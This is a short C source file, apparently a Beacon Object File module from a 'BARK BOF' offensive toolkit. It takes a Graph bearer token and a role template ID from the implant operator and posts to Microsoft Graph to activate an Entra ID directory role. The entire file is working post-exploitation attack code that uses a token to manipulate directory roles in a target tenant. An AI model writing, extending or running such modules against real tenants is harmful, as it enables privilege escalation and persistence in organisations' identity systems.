/*
 * enable_entra_role.c — BARK BOF
 * Enable-EntraRole — Activate an Entra ID directory role
 *
 * Args : token (Graph Bearer), roleId (roleTemplateId)
 * API  : POST graph.microsoft.com/v1.0/directoryRoles
 *
 * Author : BARK BOF project
 * License: GPLv3
 */

#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"

void go(char *args, int alen)
{
    datap  parser;
    char  *token  = NULL;
    char  *roleId = NULL;
    char   bodyBuf[1024];

    BeaconDataParse(&parser, args, alen);
    token  = BeaconDataExtract(&parser, NULL);
    roleId = BeaconDataExtract(&parser, NULL);

    if (!token || !roleId ||
        MSVCRT$strlen(token) == 0 || MSVCRT$strlen(roleId) == 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Usage: bark_enable_entra_role <token> <roleId>\n");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Activating Entra ID directory role: %s\n", roleId);

    MSVCRT$sprintf_s(bodyBuf, sizeof(bodyBuf),
        "{\"roleTemplateId\":\"%s\"}", roleId);

    BarkPost(L"graph.microsoft.com", L"/v1.0/directoryRoles", L"POST",
             bodyBuf, token, "application/json");
}
